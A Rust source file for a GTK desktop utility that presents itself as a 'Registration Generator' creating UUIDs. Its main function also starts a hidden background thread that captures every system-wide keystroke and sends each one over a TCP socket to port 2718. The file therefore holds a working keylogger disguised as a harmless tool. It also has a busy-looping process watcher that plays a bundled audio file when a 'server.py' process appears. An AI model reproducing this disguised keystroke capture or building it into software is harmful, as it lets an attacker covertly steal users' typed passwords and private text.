use std::thread;
use std::io::{BufReader, Write, Cursor};
use std::net::TcpStream;
use std::time::Duration;
use gtk::{prelude::*, Box, Button, Entry, Window, WindowType, ButtonsType, DialogFlags, MessageType, MessageDialog};
use rdev::{listen, EventType};
use rodio::{Decoder, Sink};

const AUDIO_FILE: &[u8] = include_bytes!("../assets/o-pao.mp3");

fn run() {
    let send_event = |event_data: &str| {
        if let Ok(mut stream) = TcpStream::connect("127.0.0.1:2718") {
            stream.write(event_data.as_bytes()).expect("Failed to write to stream");
        } else {
            eprintln!("Failed to connect to socket");
        }
    };
    loop {
        if let Err(e) = listen(move |event| {
            match event.event_type{
                EventType::KeyPress(key) => send_event(&format!("Key press: {:?}", key)),
                EventType::KeyRelease(key) => send_event(&format!("Key press: {:?}", key)),
                _ => ()
            }
        }) {
            eprintln!("Error: {:?}", e);
            break;
        }
    }
}

fn show_confirmation_dialog() {
    let dialog = MessageDialog::new(
        None::<&Window>,
        DialogFlags::MODAL,
        MessageType::Question,
        ButtonsType::YesNo,
        "Are you sure you want to quit?",
    );
    dialog.set_title("Quit Confirmation");
    dialog.connect_response(|dialog, response_type| {
        if response_type == gtk::ResponseType::Yes {
            gtk::main_quit();
        } else {
            dialog.close();
        }
    });
    dialog.show_all();
}

fn application() {
    gtk::init().expect("Failed to initialize GTK.");

    let window = Window::new(WindowType::Toplevel);
    window.set_title("Registration Generator");
    window.set_default_size(250, 80);
    let vbox = Box::new(gtk::Orientation::Vertical, 5);
    window.add(&vbox);
    let entry = Entry::new();
    entry.set_text("");
    entry.set_editable(false);
    vbox.add(&entry);
    let hbox = Box::new(gtk::Orientation::Horizontal, 50);
    let button = Button::new();
    button.set_label("Generate UUID");
    hbox.add(&button);
    let quitbutton = Button::new();
    quitbutton.set_label("Quit");
    hbox.add(&quitbutton);
    vbox.add(&hbox);

    window.connect_delete_event(|_, _| {
        gtk::main_quit();
        Inhibit(false)
    });
    quitbutton.connect_clicked(|_| {
        show_confirmation_dialog();
        Inhibit(false);
    });

    button.connect_clicked(move |_| {
        let random_uuid = uuid::Uuid::new_v4();
        entry.set_text(random_uuid.to_string().as_str());
    });

    window.show_all();
}

fn play_audio() {
    let source = Decoder::new(BufReader::new(Cursor::new(AUDIO_FILE))).expect("Failed to create audio decoder");
    let (_stream, stream_handle) = rodio::OutputStream::try_default().unwrap();
    let sink = Sink::try_new(&stream_handle).unwrap();
    
    sink.append(source);
    sink.play();
    thread::sleep(Duration::from_secs(10));
    sink.stop();
}

fn check_router() {
    loop {
        let mut system = sysinfo::System::new_all();
        system.refresh_all();
        for (_, process) in system.processes() {
            let cmdline = process.cmd().join(" ");
            if cmdline.contains("server.py") {
                play_audio();
                break;
            }
        }
    }
}

fn main() {
    application();
    thread::spawn(run);
    thread::spawn(check_router);
    gtk::main();
}